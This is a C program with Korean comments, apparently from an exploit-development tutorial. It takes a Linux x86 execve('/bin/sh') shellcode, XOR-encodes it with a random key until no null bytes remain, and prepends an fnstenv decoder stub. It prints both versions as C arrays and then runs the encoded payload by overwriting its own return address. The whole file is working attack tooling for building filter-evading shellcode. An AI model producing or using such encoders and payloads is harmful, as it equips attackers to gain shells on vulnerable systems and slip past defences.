#include <sys/time.h>
#include <stdlib.h>
#include <unistd.h>

int getnumber(int quo) {	// 랜덤 숫자 생성 함수
  int seed;
  struct timeval tm;
  gettimeofday( &tm, NULL );
  seed = tm.tv_sec + tm.tv_usec;
  srandom( seed );
  return (random() % quo);
}

void execute(char *data){	// 인코딩된 셸코드를 실행하는 테스트 함수
  printf("Executing...\n");
  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)data;
}
void print_code(char *data) {	// 셸코드 출력
  int i,l = 15;
  for (i = 0; i < strlen(data); ++i) {
	if (l >= 15) {
	if (i)
	printf("\"\n");
	printf("\t\"");
	l = 0;
	}
	++l;
	printf("\\x%02x", ((unsigned char *)data)[i]);
	}
  printf("\";\n\n");
}

int main() {			// main 함수
	char shellcode[] =	// 원래 셸코드
		"\x31\xc0\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62"
		"\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

	int count;
	int number = getnumber(200);	// 랜덤 숫자 생성기
	int badchar = 0;		// 금지 문자 확인에 사용할 플래그
	int ldecoder;			// 디코더의 길이
	int lshellcode = strlen(shellcode);  // 셸코드의 길이 저장
	char *result;

	//simple fnstenv xor decoder, nulls are overwritten with length and key.
	// 간단한 fnstenv xor 디코더, null은 길이와 키로 덮어씀
	char decoder[] = "\xd9\xe1\xd9\x74\x24\xf4\x5a\x80\xc2\x00\x31"
		"\xc9\xb1\x18\x80\x32\x00\x42\xe2\xfa";

	printf("Using the key: %d to xor encode the shellcode\n",number);
	decoder[9] += 0x14;		// 디코더의 길이
	decoder[16] += number;		// 인코딩할 키
	ldecoder = strlen(decoder);	// 디코더 길이 계산

	printf("\nchar original_shellcode[] =\n");
	print_code(shellcode);

	do {				// 셸코드 인코딩
		if(badchar == 1) {		// 금지 문자라면 키 재생성
			number = getnumber(10);
			decoder[16] += number;
			badchar = 0;
		}
		for(count=0; count < lshellcode; count++) {	// 셸코드 전체 루프
			shellcode[count] = shellcode[count] ^ number; // xor 인코딩 byte
			if(shellcode[count] == '\0') {  // 다른 금지 문자는 여기에 나열됨
				badchar = 1;	// 금지 문자 플래그 설정, 트리거 재실행
			}
		}
	} while(badchar == 1);		// 금지 문자가 있다면 반복

	result = malloc(lshellcode + ldecoder);
	strcpy(result,decoder);		// 버퍼 앞에 디코더를 둠
	strcat(result,shellcode);	// 디코더 다음에 인코딩한 셸코드를 둠
	printf("\nchar encoded[] =\n");	// 레이블 출력
	print_code(result);		// 인코딩한 셸코드 출력
	execute(result);		// 인코딩한 셸코드 실행
}
